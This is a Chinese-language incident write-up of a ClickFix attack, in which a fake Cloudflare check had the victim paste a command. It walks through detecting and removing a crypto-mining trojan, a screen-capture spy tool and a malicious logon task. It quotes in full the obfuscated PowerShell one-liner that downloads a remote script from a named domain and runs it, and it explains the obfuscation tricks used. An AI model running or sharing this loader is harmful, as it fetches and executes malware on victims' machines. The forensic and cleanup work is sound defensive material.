# 经典的 "ClickFix" 社工攻击

## 攻击手法

这种攻击近两年非常流行，套路固定：

1. 访问某个网站（可能是钓鱼站，也可能是被挂马的正常站）
2. 弹出提示框，伪装成 Cloudflare 验证、reCAPTCHA、Windows 安全检查等
3. 提示"按 Win+R 打开运行框，粘贴以下命令进行验证"
4. 用户粘贴执行后，实际运行了混淆的 PowerShell 下载器





## 建议

- 任何网站要求打开运行框、PowerShell 或终端执行命令，**100% 是攻击**
- 正规的验证码（Cloudflare、Google）永远不会要求执行命令



## 中毒过程

某日访问某网站，先是弹出 Cloudflare 验证，然后又提示"按 Win+R 打开运行框，粘贴以下命令进行验证"

```bash
powershell.exe -Windo mINiM $oDQCnaWf=irm unDERpERFORMIZe.CoM;$TCA=(64,$lGU,$Ba,4);$Bzt=0;$TCA.FOReAch({$BZT+=$_});.((GeT-Alias)[$bZt]).naMe $odqCnAWf$efwCjCeJFpsQnzUdNXlQukgOUQFRYWfqiggBTbxxVUFYpgrRYIJkePIxjOAxwQc
```

### 分析这一段经过混淆的恶意 PowerShell 命令

逐层拆解如下：

**1. 隐藏窗口启动** `-Windo mINiM` 即 `-WindowStyle Minimized`，最小化窗口运行，让用户看不到。

**2. 远程下载** `irm unDERpERFORMIZe.CoM` — `irm` 是 `Invoke-RestMethod` 的别名，从该域名下载远程内容，存入变量 `$oDQCnaWf`。

**3. 数学混淆计算索引值**

```
$TCA=(64, $lGU, $Ba, 4)  # 未定义变量默认为0 → (64,0,0,4)
$Bzt=0; $TCA.ForEach({$Bzt+=$_})  # 求和 = 68
```

**4. 通过别名表间接调用 `Invoke-Expression`** `(Get-Alias)[68]` 取 PowerShell 别名列表中索引 68 的项，通常对应 `iex`（即 `Invoke-Expression`）。用 `.Name` 取其名称，再用 `.` 调用运算符执行。

**5. 执行下载的代码** 最终效果等价于：

```
iex <从远程服务器下载的脚本内容>
```

末尾的长随机字符串可能是参数、密钥或进一步的混淆填充。

------

**总结：这是一个典型的恶意代码投递器（dropper）**，手法包括：大小写混淆绕过检测、隐藏窗口运行、间接引用 `iex` 避免关键字匹配、远程下载并执行任意代码。

如果是在自己的环境中发现这条命令，建议立即排查该机器是否已被入侵，并检查相关网络日志中是否有对该域名的请求记录。



## 恶意 PowerShell 执行后的排查与清除指南

### 一、立即止血

先断网隔离，防止进一步通信或横向移动：

```powershell
# 禁用网卡（管理员权限）
Get-NetAdapter | Disable-NetAdapter -Confirm:$false
```

或者直接拔网线/断 Wi-Fi。

------

### 二、排查下载了什么

#### 1. 查看 PowerShell 历史记录

```powershell
# 控制台历史（当前会话）
Get-History | Format-List

# 持久化的 PSReadLine 历史文件
cat (Get-PSReadLineOption).HistorySavePath
```

#### 2. 查看 PowerShell 事件日志

这是最关键的一步，如果系统开启了 Script Block Logging，可以还原完整的下载内容：

```powershell
# 查看 PowerShell 脚本块日志（事件ID 4104）
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" |
  Where-Object { $_.Id -eq 4104 } |
  Sort-Object TimeCreated -Descending |
  Select-Object -First 20 TimeCreated, Message |
  Format-List
# 查看传统 PowerShell 日志（事件ID 400/403/600）
Get-WinEvent -LogName "Windows PowerShell" |
  Sort-Object TimeCreated -Descending |
  Select-Object -First 20 TimeCreated, Message |
  Format-List
```

#### 3. 检查网络连接记录

```powershell
# 当前活跃连接
netstat -ano | findstr ESTABLISHED

# DNS 缓存，确认是否解析了恶意域名
Get-DnsClientCache | Where-Object { $_.Entry -like "*underperformize*" }
```

#### 4. 检查临时目录是否有落地文件

```powershell
# 常见恶意文件落地位置
$paths = @(
    $env:TEMP,
    $env:APPDATA,
    "$env:LOCALAPPDATA\Temp",
    "$env:USERPROFILE\Downloads",
    "C:\ProgramData"
)
foreach ($p in $paths) {
    Get-ChildItem -Path $p -Recurse -File -ErrorAction SilentlyContinue |
      Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-2) } |
      Select-Object FullName, Length, LastWriteTime
}
```

#### 5. 检查是否建立了持久化

```powershell
# 计划任务
Get-ScheduledTask | Where-Object {
    $_.Date -gt (Get-Date).AddHours(-2) -or
    $_.TaskPath -notlike "\Microsoft\*"
} | Format-List TaskName, TaskPath, State

# 注册表 Run 键
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# 启动文件夹
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
Get-ChildItem "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

# WMI 事件订阅（常见无文件持久化手法）
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
```

#### 6. 检查新增用户和异常进程

```powershell
# 新增用户
net user

# 可疑进程
Get-Process | Where-Object {
    $_.Path -and $_.Path -notlike "C:\Windows\*" -and $_.Path -notlike "C:\Program Files*"
} | Select-Object Name, Id, Path, StartTime | Sort-Object StartTime -Descending
```

------

### 三、清除步骤

根据排查结果执行：

```powershell
# 1. 终止可疑进程
Stop-Process -Id <PID> -Force

# 2. 删除落地文件
Remove-Item -Path "<可疑文件路径>" -Force

# 3. 清除恶意计划任务
Unregister-ScheduledTask -TaskName "<任务名>" -Confirm:$false

# 4. 清除注册表持久化
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "<键名>"

# 5. 清除 WMI 持久化
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer | Remove-WMIObject
Get-WMIObject -Namespace root\Subscription -Class __EventFilter | Remove-WMIObject
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding | Remove-WMIObject

# 6. 刷新 DNS 缓存
Clear-DnsClientCache
```

------

### 四、进一步建议

**如果事件日志中成功还原了下载的脚本内容**，仔细分析它做了什么再针对性清除，这比盲目排查更高效。

**如果日志中没有记录**（Script Block Logging 未开启），而且排查中发现了明确的持久化或异常进程，最安全的做法是**备份数据后重装系统**，因为无文件恶意软件可能藏在你排查不到的地方。

**同时修改该机器上登录过的所有账户密码**（包括浏览器中保存的密码），因为信息窃取（InfoStealer）是这类攻击最常见的目标之一。

### 五、操作日志
```bat
Name                   Id Path
----                   -- ----
HipsMain           164840 D:\Program Files\Huorong\Sysdiag\bin\HipsMain.exe
Crisp              164064 C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe
HipsDaemon          30420 d:\Program Files\Huorong\Sysdiag\bin\HipsDaemon.exe
vmware-tray         17960 D:\Program Files (x86)\VMware\VMware Workstation\vmware-tray.exe
crashpad_handler    17404 d:\Program Files\Netease\GameViewer\bin\crashpad_handler.exe
GameViewer          16308 d:\Program Files\Netease\GameViewer\bin\GameViewer.exe
HipsTray             6200 d:\Program Files\Huorong\Sysdiag\bin\HipsTray.exe
PopBlock            10356 D:\Program Files\Huorong\Sysdiag\bin\PopBlock.exe
crashpad_handler     9336 d:\Program Files\Netease\GameViewer\bin\crashpad_handler.exe
vmware-authd         5720 D:\Program Files (x86)\VMware\VMware Workstation\vmware-authd.exe
crashpad_handler     8180 d:\Program Files\Netease\GameViewer\bin\crashpad_handler.exe
GameViewerHealthd    7616 d:\Program Files\Netease\GameViewer\bin\GameViewerHealthd.exe
GameViewerServer     7420 d:\Program Files\Netease\GameViewer\bin\GameViewerServer.exe
crashpad_handler     6952 d:\Program Files\Netease\GameViewer\crashpad_handler.exe
RCService            6344 C:\Users\SW\AppData\Local\Temp\AnyViewer\RCService.exe
GameViewerService    5472 d:\Program Files\Netease\GameViewer\GameViewerService.exe
bh_local             5176 d:\Program Files (x86)\Bastion\bh_local.exe
UpgradeService       5108 C:\ProgramData\123SyncCloud\service\UpgradeService.exe
MaintenanceService   5084 C:\ProgramData\123SyncCloud\service\MaintenanceService.exe
PS C:\Windows\system32>
PS C:\Windows\system32> net user
\\ADMINISTRATOR 的用户帐户
-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
SW                       WDAGUtilityAccount
命令成功完成。
PS C:\Windows\system32>
```



## 分析结果：发现两个高度可疑进程

### 重点关注

### 1. `Crisp.exe` — **高度可疑**

```
PID: 164064
路径: C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe
```

这个最可疑。`srv_runtime_v9_rtm` 不是任何已知软件的目录名，而且位于用户目录下，非常符合恶意软件的落地特征。**这很可能就是那条 PowerShell 命令下载执行的东西。**

### 2. `RCService.exe` — **可疑**

```
PID: 6344
路径: C:\Users\SW\AppData\Local\Temp\AnyViewer\RCService.exe
```

AnyViewer 是远程控制软件，而且运行在 `Temp` 目录下。如果你没有主动安装过 AnyViewer，这很可能是恶意软件部署的**远控后门**，用于持久远程访问你的机器。

------

### 其余进程正常

- **Huorong（火绒）**：HipsMain / HipsDaemon / HipsTray / PopBlock — 正常杀软
- **VMware**：vmware-tray / vmware-authd — 正常
- **网易 GameViewer**：正常
- **123云盘同步服务**：如果你装过 123 云盘则正常
- **Bastion (bh_local)**：如果你装过堡垒主机软件则正常

用户账户没有异常新增，这点是好的。

------

### 建议立即执行

```powershell
# 1. 先别急着杀进程，先取证 —— 看看 Crisp.exe 的详细信息
Get-Item "C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe" | Select-Object FullName, Length, CreationTime, LastWriteTime
Get-AuthenticodeSignature "C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe"

# 查看该目录下还有什么
Get-ChildItem "C:\Users\SW\srv_runtime_v9_rtm" -Recurse

# 2. 同样检查 AnyViewer
Get-ChildItem "C:\Users\SW\AppData\Local\Temp\AnyViewer" -Recurse
Get-AuthenticodeSignature "C:\Users\SW\AppData\Local\Temp\AnyViewer\RCService.exe"

# 3. 查看 Crisp.exe 的网络连接
netstat -ano | findstr 164064
netstat -ano | findstr 6344
```

先执行上面的命令把结果发给我看，确认后再进行清除。特别是 `srv_runtime_v9_rtm` 目录下的完整内容和 Crisp.exe 的签名信息，这能帮助判断它具体是什么类型的恶意软件。

### 操作日志

```bat
PS C:\Windows\system32> Get-Item "C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe" | Select-Object FullName, Length, CreationTime, LastWriteTime

FullName                                 Length CreationTime      LastWriteTime
--------                                 ------ ------------      -------------
C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe 342224 2026/4/3 14:15:20 2026/4/3 14:15:20


PS C:\Windows\system32>
PS C:\Windows\system32> Get-AuthenticodeSignature "C:\Users\SW\srv_runtime_v9_rtm\Crisp.exe"


    目录: C:\Users\SW\srv_runtime_v9_rtm


SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
1DB2458D019E992DF399398BE90660F00699ADF5  Valid                                  Crisp.exe


PS C:\Windows\system32> Get-ChildItem "C:\Users\SW\srv_runtime_v9_rtm" -Recurse


    目录: C:\Users\SW\srv_runtime_v9_rtm


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2026/4/3     14:15         342224 Crisp.exe


PS C:\Windows\system32> Get-ChildItem "C:\Users\SW\AppData\Local\Temp\AnyViewer" -Recurse


    目录: C:\Users\SW\AppData\Local\Temp\AnyViewer


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          2025/7/3      9:29                data
d-----          2025/5/7     20:25                FileIcon
d-----         2025/5/10     19:00                iconengines
d-----          2025/5/7     20:25                Image
d-----         2025/5/10     19:00                imageformats
d-----          2025/5/7     20:25                logs
d-----         2025/4/30     14:33                plugins
d-----         2025/5/10     19:00                skin
d-----         2025/5/10     19:00                styles
-a----         2025/1/21     10:43        3044592 AVCore.exe
-a----         2024/7/19     15:42          47600 CFDH.exe
------         2024/6/13     17:55         485376 libcurl.dll
------         2024/5/27      9:11        1214976 libeay32.dll
------         2024/5/27      9:11         448384 msvcp140.dll
------         2024/5/27      9:11         773968 msvcr100.dll
-a----         2025/1/23     15:51        9505008 RCClient.exe
-a----         2025/1/21     10:43        1119984 RCService.exe
-a----         2024/5/27      9:11         457200 SplashWin.exe
------         2024/5/27      9:11         275456 ssleay32.dll
------         2024/5/27      9:11          76168 vcruntime140.dll
------         2021/3/17     14:19          74752 zlib1.dll


    目录: C:\Users\SW\AppData\Local\Temp\AnyViewer\data


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          2026/1/8     10:06           3325 PrjSettings.json


    目录: C:\Users\SW\AppData\Local\Temp\AnyViewer\plugins


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         2025/5/10     19:00                imageformats
d-----         2025/5/10     19:00                platforms
d-----         2025/5/10     19:00                styles


PS C:\Windows\system32> Get-AuthenticodeSignature "C:\Users\SW\AppData\Local\Temp\AnyViewer\RCService.exe"


    目录: C:\Users\SW\AppData\Local\Temp\AnyViewer


SignerCertificate                         Status                                 Path
-----------------                         ------                                 ----
257F56D595316F1E2810D992911AC064E193830C  Valid                                  RCService.exe


PS C:\Windows\system32> netstat -ano | findstr 164064
  TCP    172.18.213.27:59487    91.199.163.124:3333    ESTABLISHED     164064
  TCP    172.18.213.27:59495    91.199.163.124:3334    ESTABLISHED     164064
PS C:\Windows\system32> netstat -ano | findstr 6344
  TCP    0.0.0.0:30196          0.0.0.0:0              LISTENING       6344
  TCP    172.18.213.27:64399    172.96.160.45:30192    ESTABLISHED     6344
PS C:\Windows\system32>
```

## 确认结果：Crisp.exe 是加密货币挖矿木马

### 关键证据

### Crisp.exe — **挖矿木马，确认无疑**

- **创建时间**：今天 14:15，与你执行那条 PowerShell 命令的时间吻合

- 网络连接：

  ```
  → 91.199.163.124:3333    ESTABLISHED→ 91.199.163.124:3334    ESTABLISHED
  ```
  
  端口 3333/3334 是 Stratum 矿池协议的标准端口

  ，这是加密货币挖矿的铁证。你的 CPU/GPU 正在给攻击者挖矿。

### AnyViewer — **可能无关**

文件日期都在 2024-2025 年，远早于今天的攻击。如果你之前自己装过 AnyViewer 可以暂时不管。但如果你确认从未安装过，也应该一并清除。

------

### 立即清除 — 逐步执行

```powershell
# 1. 杀掉挖矿进程
Stop-Process -Id 164064 -Force

# 2. 删除挖矿文件和目录
Remove-Item -Path "C:\Users\SW\srv_runtime_v9_rtm" -Recurse -Force

# 3. 检查是否有持久化（计划任务）
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -like "*Crisp*" -or
    $_.Actions.Execute -like "*srv_runtime*"
} | Format-List TaskName, TaskPath, State, Actions

# 4. 检查注册表 Run 键
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" | Format-List

# 5. 检查启动目录
Get-ChildItem "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
```

先执行上面的命令，特别是第 3、4、5 步。如果发现有包含 `Crisp` 或 `srv_runtime` 的计划任务或注册表项，发给我看，我帮你确认后一起清除。否则挖矿进程会在重启后复活。

------

## 额外建议

- 清除完成后用火绒做一次全盘扫描，看看有没有遗漏
- 检查你的 CPU 使用率是否恢复正常（挖矿进程在时占用会很高）
- 那条 PowerShell 命令是从哪里来的？如果是别人发给你的链接或脚本，要警惕信息来源



### 其它排查内容

```bat
# 1) 看是否还有到该 IP 的连接
Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -eq "91.199.163.124"} |
Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess

# 2) 看启动项
Get-CimInstance Win32_StartupCommand |
Select-Object Name, Command, Location

reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"

# 3) 看计划任务
schtasks /query /fo LIST /v | findstr /i "Crisp srv_runtime Razor Runner"

# 4) 看服务
wmic service get name,displayname,pathname,startmode | findstr /i "Crisp srv_runtime Razor Runner"

# 5) 看这几个目录是否真的没了
Test-Path "C:\Users\SW\srv_runtime_v9_rtm"
Test-Path "C:\ProgramData\srv_runtime_v9_rtm"

# 6) 看近期可疑文件
Get-ChildItem "$env:TEMP","$env:LOCALAPPDATA","$env:APPDATA","C:\ProgramData" -Recurse -ErrorAction SilentlyContinue |
Where-Object {$_.FullName -match "Crisp|srv_runtime|Razor|Runner"} |
Select-Object FullName, Length, CreationTime, LastWriteTime
```



-------------

## 通过everything搜索srv_runtime_v9_rtm，发现以下目录

![image-20260404134609656](pics\image-20260404134609656.png)



## 这是同一攻击者部署的另一个恶意组件

### 关键判断

**目录名 `srv_runtime_v9_rtm`** 与之前的挖矿木马 `C:\Users\SW\srv_runtime_v9_rtm` 使用完全相同的命名模式，只是这次藏在了 `C:\ProgramData\` 下，而且创建时间是 **3月30日**，比今天的 Crisp.exe 挖矿木马**还早4天**——说明你的机器可能更早就已经被入侵了。

### 文件分析

**`Runner-Razor.exe`** 是主程序，配合以下库来看功能很明确：

| 组件                                       | 用途                                       |
| ------------------------------------------ | ------------------------------------------ |
| avcodec / avformat / avfilter / swscale 等 | FFmpeg 视频编解码库，用于**屏幕录制/截屏** |
| Qt5Core / Qt5Gui / Qt5Widgets / Qt5Network | Qt GUI 框架 + **网络传输能力**             |
| MMCodec.dll                                | 多媒体编码                                 |
| scanner-ctrl.map                           | 扫描/控制配置                              |
| pipeline-trace.pdb                         | 调试符号（攻击者忘了删）                   |
| WinSparkle.dll                             | 自动更新框架                               |

**这是一个具备屏幕捕获和网络回传能力的间谍/远控工具。** 它可以录制你的屏幕内容并发送给攻击者。

------

### 立即处理

```powershell
# 1. 检查 Runner-Razor 是否正在运行
Get-Process | Where-Object { $_.Path -like "*srv_runtime*" -or $_.Name -like "*Runner*" -or $_.Name -like "*Razor*" }

# 2. 检查它的网络连接
Get-NetTCPConnection | Where-Object {
    $_.OwningProcess -in (Get-Process | Where-Object { $_.Path -like "*srv_runtime*" }).Id
}

# 3. 检查关联的持久化
Get-ScheduledTask | Where-Object {
    $_.Actions.Execute -like "*Runner*" -or
    $_.Actions.Execute -like "*srv_runtime*" -or
    $_.Actions.Execute -like "*Razor*"
} | Format-List TaskName, Actions

# 4. 确认后删除
Stop-Process -Name "Runner-Razor" -Force -ErrorAction SilentlyContinue
Remove-Item -Path "C:\ProgramData\srv_runtime_v9_rtm" -Recurse -Force
```

------

### 重要警告

你的机器从 **3月30日起就已经被控制**，这个间谍组件比挖矿木马更危险。这意味着：

- 过去几天你屏幕上显示过的一切（密码输入、聊天记录、工作内容）都可能已经被截获
- **立即修改所有重要密码**，特别是在这台机器上登录过的账户
- 检查浏览器保存的密码是否被导出过
- 如果涉及工作系统（比如你管理的 Rancher/服务器），也需要轮换相关凭据

你还记得 3月30日前后是否也执行过什么可疑命令或打开过什么链接吗？

--------------

### 排查日志

```bat
PS C:\Windows\system32> Get-ChildItem "C:\Users\SW\srv_runtime_v9_rtm" -Recurse
PS C:\Windows\system32>
PS C:\Windows\system32>
PS C:\Windows\system32> netstat -ano | findstr 164064
PS C:\Windows\system32> Get-Process | Where-Object { $_.Path -like "*srv_runtime*" -or $_.Name -like "*Runner*" -or $_.Name -like "*Razor*" }
PS C:\Windows\system32> }
>>     $_.OwningProcess -in (Get-Process | Where-Object { $_.Path -like "*srv_runtime*" }).Id
>> Get-NetTCPConnection | Where-Object {^C
PS C:\Windows\system32>
PS C:\Windows\system32>
PS C:\Windows\system32>
PS C:\Windows\system32> Get-NetTCPConnection | Where-Object {
>>     $_.OwningProcess -in (Get-Process | Where-Object { $_.Path -like "*srv_runtime*" }).Id
>> }
PS C:\Windows\system32> ^C
PS C:\Windows\system32> Get-ScheduledTask | Where-Object {
>> $_.Actions.Execute -like "*Runner*" -or
>> $_.Actions.Execute -like "*srv_runtime*" -or
>> $_.Actions.Execute -like "*Razor*"
>> } | Format-List TaskName, Actions
TaskName : UIThread_net48_i386
Actions  : {MSFT_TaskExecAction}
TaskName : MareBackup
Actions  : {MSFT_TaskExecAction, MSFT_TaskExecAction, MSFT_TaskExecAction}
TaskName : Microsoft Compatibility Appraiser
Actions  : {MSFT_TaskExecAction}
TaskName : ProgramDataUpdater
Actions  : {MSFT_TaskExecAction}
PS C:\Windows\system32> Stop-Process -Name "Runner-Razor" -Force -ErrorAction SilentlyContinue
PS C:\Windows\system32> Remove-Item -Path "C:\ProgramData\srv_runtime_v9_rtm" -Recurse -Force
PS C:\Windows\system32>
```



## 进展不错，但发现可疑计划任务

Crisp.exe 挖矿进程已终止，`ProgramData\srv_runtime_v9_rtm` 已删除。

但计划任务中有两个**高度可疑**的需要进一步检查：

### 重点排查

`Microsoft Compatibility Appraiser` 和 `ProgramDataUpdater` 是 Windows 自带的合法任务，不用管。但这两个不正常：

| 任务名                  | 可疑原因                                      |
| ----------------------- | --------------------------------------------- |
| **UIThread_net48_i386** | 伪装成 .NET 组件名，实际不是 Windows 自带任务 |
| **MareBackup**          | 有 3 个执行动作，名称不属于已知软件           |

请执行以下命令查看它们的详细信息：

```powershell
# 查看完整详情
Get-ScheduledTask -TaskName "UIThread_net48_i386" | Select-Object * | Format-List
(Get-ScheduledTask -TaskName "UIThread_net48_i386").Actions | Select-Object Execute, Arguments | Format-List

Get-ScheduledTask -TaskName "MareBackup" | Select-Object * | Format-List
(Get-ScheduledTask -TaskName "MareBackup").Actions | Select-Object Execute, Arguments | Format-List

# 同时检查注册表 Run 键是否有残留
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
```

把结果发给我看。如果这两个计划任务指向恶意路径，它们就是持久化机制——负责在你重启后重新下载和启动挖矿/间谍程序。不清除的话，删掉的文件还会重新出现。



--------------

### 排查日志

```bat
PS C:\Windows\system32> (Get-ScheduledTask -TaskName "MareBackup").Actions | Select-Object Execute, Arguments | Format-List


Execute   : %windir%\system32\compattelrunner.exe
Arguments : -m:aeinv.dll -f:UpdateSoftwareInventoryW invsvc

Execute   : %windir%\system32\compattelrunner.exe
Arguments : -m:appraiser.dll -f:DoScheduledTelemetryRun

Execute   : %windir%\system32\compattelrunner.exe
Arguments : -m:aemarebackup.dll -f:BackupMareData



PS C:\Windows\system32> Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"


OneDrive                                                 : "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background
QQNT                                                     : "C:\Program Files\Tencent\QQNT\QQ.exe" /background
BaiduYunDetect                                           : "E:\Users\SW\baidupan\BaiduNetdisk\YunDetectService.exe"
electron.app.BlueStacks Services                         : C:\Users\SW\AppData\Local\Programs\bluestacks-services\BlueStacksServices.exe --hidden
GameViewer                                               : "d:\Program Files\Netease\GameViewer\GameViewer.exe" --auto-run
org.yuanli.utools                                        : C:\Users\SW\AppData\Local\Programs\utools\uTools.exe
ApifoxAppAgent                                           : C:\Users\SW\AppData\Roaming\apifox\ApifoxAppAgent.exe
MicrosoftEdgeAutoLaunch_EAC260E2A74ACFAE0CFBB48BD28C7021 : "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start
PSPath                                                   : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
PSParentPath                                             : Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion
PSChildName                                              : Run
PSDrive                                                  : HKCU
PSProvider                                               : Microsoft.PowerShell.Core\Registry



PS C:\Windows\system32> Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"


SecurityHealth          : C:\Windows\system32\SecurityHealthSystray.exe
SunloginClient          : "C:\Program Files\Oray\SunLogin\SunloginClient\SunloginClient.exe" --cmd=autorun
Sysdiag                 : "d:\Program Files\Huorong\Sysdiag\bin\HipsTray.exe"
Autodesk Access Service : "C:\Program Files\Autodesk\AdODIS\V1\Setup\AdskAccessService.exe" --autoLaunch
deviceTRUST Client User : "C:\PROGRA~2\Citrix\DEVICE~1\Bin64\DTCLIE~1.EXE"
GlobalProtect           : "C:\Program Files\Palo Alto Networks\GlobalProtect\PanGPA.exe"
Autodesk Access         : "C:\Program Files\Autodesk\AdODIS\V1\Access\AdskAccessCore.exe" --minimizedUi --autoLaunch
KeePass 2 PreLoad       : "d:\Program Files\KeePass Password Safe 2\KeePass.exe" --preload
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion
PSChildName             : Run
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry



PS C:\Windows\system32>
```





## 找到持久化机制了

### `UIThread_net48_i386` — 确认是恶意计划任务

```
Execute:  C:\ProgramData\srv_runtime_v9_rtm\Runner-Razor.exe
触发器:   MSFT_TaskLogonTrigger（每次登录自动执行）
TaskPath: \（根目录，不在任何 Windows 子路径下）
Author:   空
Description: 空
```

这就是攻击者的持久化手段——每次你登录系统就自动启动间谍程序。虽然文件已经删了，但任务还在，下次攻击者投放新文件到同一路径就会复活。

### 其他检查结果

- **MareBackup** — 正常，是 Windows 兼容性遥测组件，执行的是 `compattelrunner.exe`
- **注册表 Run 键** — 全部是已知合法软件，没有异常

------

### 立即清除

```powershell
# 删除恶意计划任务
Unregister-ScheduledTask -TaskName "UIThread_net48_i386" -Confirm:$false
```

然后确认一下用户目录下的挖矿文件夹是否也已清除：

```powershell
# 确认两个恶意目录都已不存在
Test-Path "C:\Users\SW\srv_runtime_v9_rtm"
Test-Path "C:\ProgramData\srv_runtime_v9_rtm"

# 确认 Crisp.exe 进程已不存在
Get-Process -Name "Crisp" -ErrorAction SilentlyContinue
```

------

### 清除后总结清单

执行完后，本次攻击的已知组件应该全部清除了：

| 组件                  | 位置                                 | 状态         |
| --------------------- | ------------------------------------ | ------------ |
| Crisp.exe 挖矿木马    | `C:\Users\SW\srv_runtime_v9_rtm\`    | 已删除       |
| Runner-Razor 间谍工具 | `C:\ProgramData\srv_runtime_v9_rtm\` | 已删除       |
| 持久化计划任务        | `UIThread_net48_i386`                | **待删除 ↑** |

最后建议用火绒做一次全盘扫描收尾，并**尽快修改重要密码**——尤其是在这台机器上用浏览器登录过的账户，因为间谍程序从3月30日起就可能在捕获你的屏幕内容了。

### 清理日志
```bat
PS C:\Windows\system32> Get-NetTCPConnection -State Established | Where-Object {$_.RemoteAddress -eq "91.199.163.124"} |
>> Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess
PS C:\Windows\system32> Get-CimInstance Win32_StartupCommand |
>>

Name                                                     Command                                                                                    Location
----                                                     -------                                                                                    --------
OneDriveSetup                                            C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup                                        HKU\S-1-5-19\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
OneDriveSetup                                            C:\Windows\SysWOW64\OneDriveSetup.exe /thfirstsetup                                        HKU\S-1-5-20\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Citrix Workspace                                         Citrix Workspace.lnk                                                                       Startup
EmEditor                                                 EmEditor.lnk                                                                               Startup
OneDrive                                                 "C:\Program Files\Microsoft OneDrive\OneDrive.exe" /background                             HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
QQNT                                                     "C:\Program Files\Tencent\QQNT\QQ.exe" /background                                         HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
BaiduYunDetect                                           "E:\Users\SW\baidupan\BaiduNetdisk\YunDetectService.exe"                                   HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
electron.app.BlueStacks Services                         C:\Users\SW\AppData\Local\Programs\bluestacks-services\BlueStacksServices.exe --hidden     HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
GameViewer                                               "d:\Program Files\Netease\GameViewer\GameViewer.exe" --auto-run                            HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
org.yuanli.utools                                        C:\Users\SW\AppData\Local\Programs\utools\uTools.exe                                       HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
ApifoxAppAgent                                           C:\Users\SW\AppData\Roaming\apifox\ApifoxAppAgent.exe                                      HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
MicrosoftEdgeAutoLaunch_EAC260E2A74ACFAE0CFBB48BD28C7021 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --win-session-start         HKU\S-1-5-21-112681994-327125860-1913073728-1001\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
AdsPower                                                 D:\Program Files\AdsPower Global\AdsPower.exe                                              Common Startup
Brother iPSMonitor                                       C:\PROGRA~2\Brother\IPRINT~1\IPSMON~1\IPSMON~1.EXE --Startup                               Common Startup
SecurityHealth                                           %windir%\system32\SecurityHealthSystray.exe                                                HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
SunloginClient                                           "C:\Program Files\Oray\SunLogin\SunloginClient\SunloginClient.exe" --cmd=autorun           HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Sysdiag                                                  "d:\Program Files\Huorong\Sysdiag\bin\HipsTray.exe"                                        HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
Autodesk Access Service                                  "C:\Program Files\Autodesk\AdODIS\V1\Setup\AdskAccessService.exe" --autoLaunch             HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
